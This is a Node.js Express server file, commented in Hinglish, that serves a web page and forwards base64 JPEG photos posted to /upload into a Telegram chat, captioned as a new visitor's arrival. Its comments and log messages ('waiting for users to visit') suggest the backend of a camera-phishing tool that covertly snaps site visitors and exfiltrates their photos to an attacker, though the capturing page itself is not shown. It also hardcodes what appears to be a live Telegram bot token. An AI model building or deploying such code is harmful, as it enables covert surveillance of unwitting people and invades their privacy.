const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

// --- CONFIGURATION ---
// Apna Telegram Bot Token yahan daalein
const token = '7819967626:AAFSA5LnWfAcni_ETGiJXTZIJCgEM_ObN88'; 

// Apna Chat ID yahan daalein (jo @userinfobot se mila tha)
const chatId = 'YOUR_CHAT_ID'; // <--- ISE ZAROOR BADLEIN!

// Server ka port
const PORT = 3000;
// --------------------

// Bot aur App ko initialize karein
const bot = new TelegramBot(token);
const app = express();

// Middleware setup
app.use(cors()); // Cross-origin requests allow karega (frontend se backend)
// Body se bade data (image) ko handle karne ke liye limit badhayein
app.use(express.json({ limit: '50mb' })); 
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Frontend (index.html) ko serve karne ke liye root route
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

// '/upload' endpoint jahan frontend se photo aayega
app.post('/upload', (req, res) => {
    try {
        const { image } = req.body; // Base64 image data nikalein

        if (!image) {
            return res.status(400).json({ success: false, message: 'No image data received.' });
        }

        // Base64 string se data part alag karein (e.g., "data:image/jpeg;base64,")
        const base64Data = image.replace(/^data:image\/jpeg;base64,/, "");

        // Base64 data ko ek buffer mein convert karein
        const imageBuffer = Buffer.from(base64Data, 'base64');

        // Bot ka use karke photo bhejein
        bot.sendPhoto(chatId, imageBuffer, {
            caption: 'Ek naya user website par aaya hai!'
        }).then(() => {
            console.log('Photo successfully sent to Telegram!');
            res.json({ success: true, message: 'Image sent to Telegram.' });
        }).catch(err => {
            console.error('Failed to send photo to Telegram:', err.response ? err.response.body : err);
            res.status(500).json({ success: false, message: 'Failed to send photo.' });
        });

    } catch (error) {
        console.error('Error on /upload:', error);
        res.status(500).json({ success: false, message: 'Server error.' });
    }
});


// Server ko start karein
app.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log('Waiting for users to visit the website...');
    // Check karein ki Chat ID daala hai ya nahi
    if (chatId === 'YOUR_CHAT_ID') {
        console.warn('\n--- WARNING ---');
        console.warn('Aapne app.js file mein CHAT_ID nahi daala hai.');
        console.warn('Please replace "YOUR_CHAT_ID" with your actual Telegram Chat ID.');
        console.warn('-----------------\n');
    }
});
